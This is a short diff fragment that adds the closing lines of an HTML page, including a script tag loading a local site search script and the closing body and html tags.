+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
